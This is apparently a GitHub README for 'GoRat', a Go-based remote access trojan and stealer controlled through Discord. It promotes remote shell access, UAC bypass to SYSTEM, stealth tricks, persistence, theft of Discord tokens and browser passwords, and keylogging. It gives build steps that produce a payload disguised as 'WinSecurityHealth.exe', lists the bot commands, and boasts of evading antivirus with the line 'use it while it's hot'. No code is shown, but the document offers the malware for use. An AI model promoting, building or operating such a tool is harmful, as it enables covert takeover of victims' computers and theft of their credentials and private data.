# Go Rat
![GitHub stars](https://img.shields.io/github/stars/nw8g/GoRat?style=social)
![Downloads](https://img.shields.io/github/downloads/nw8g/GoRat/total?style=social)


A lightweight RAT and stealer, cooked up in Go. It uses Discord for C2, keeping things fast and low-profile.

**Current Status: BETA.** The tool works, but expect more features down the line.

---
## 🔥 Features
- **Remote Shell:** Full `cmd` and `powershell` access.
- **Privilege Escalation:** Methods to bypass UAC and go for god mode (`NT AUTHORITY\SYSTEM`).
- **Stealth Module**: PEB unlinking, API hooking, and process name spoofing to stay off the radar.
- **Discord C2:** Manage clients from a Discord server. Simple and effective.
- **Persistence:** Tries to stick around after a reboot.
- **Data Exfiltration:** Grabs Discord tokens and browser data (passwords, cookies, etc.).
- **Live Surveillance:** `!screen` command for a live look at the desktop.
- **Self-Destruct:** `!exit` command nukes the agent from the system.
- **Tiny Payload:** The final `.exe` is **under 3MB**.

📜 **Changelog:** [See latest updates](./CHANGELOG.md)

## Is It UD?
Let's be real. This is a POC, not a state-sponsored weapon. It's built without any serious obfuscation. Any decent analyst can tear it apart in IDA.

*   **Right now? It's SEMI-UD.** It'll slip past a lot of basic AVs.

So yeah, **use it while it's hot.**

---

##  How to Build
I made this dead simple.

1.  **Install Go.** If you don't have it, figure it out.
2.  **Run `build.bat`.** It will ask for your **Bot Token** and **Server ID**. Paste them in and hit Enter.
3.  **Done.** Look for `WinSecurityHealth.exe`. That's your payload.

##  Commands
Run these in the bot channel on Discord.

| Category                  | Command            | Description                                                    |
| ------------------------- | ------------------ | -------------------------------------------------------------- |
| **SYSTEM & CONTROL**      | `!help`            | Shows this command list.                                       |
|                           | `!privs`           | Checks current privilege level (Admin, System, etc.).          |
|                           | `!cmd <command>`   | Runs a CMD command.                                            |
|                           | `!shell <command>` | Runs a PowerShell command.                                     |
|                           | `!screen`          | Grabs a screenshot of the desktop.                             |
|                           | `!exit`            | **PANIC BUTTON.** Wipes the agent from the system.             |
| **DATA EXFILTRATION**     | `!tokengrab`       | Yanks all found Discord tokens.                                |
|                           | `!browser`         | Dumps browser data (passwords, cookies, etc).                  |
| **PRIVILEGE ESCALATION**  | `!admin [method]`  | Attempts a UAC bypass. Leave blank to try all methods.         |
|                           | `!system [method]` | Aims for `SYSTEM` privileges. Requires admin first.            |
| **STEALTH & PERSISTENCE** | `!hide [method]`   | Toggles a stealth feature. Methods: `peb`, `hook`, `spoof`.    |
|                           | `!stealth`         | Checks which stealth features are active.                      |
|                           | `!persistence`     | Sets up the agent to survive a reboot.                         |
| **MONITORING**            | `!keylogger <arg>` | Controls the keylogger. Args: start, stop, status.             |
|                           | `!keys / !keylogs` | Dumps all captured keystrokes.                                 |

---

*Have fun.*
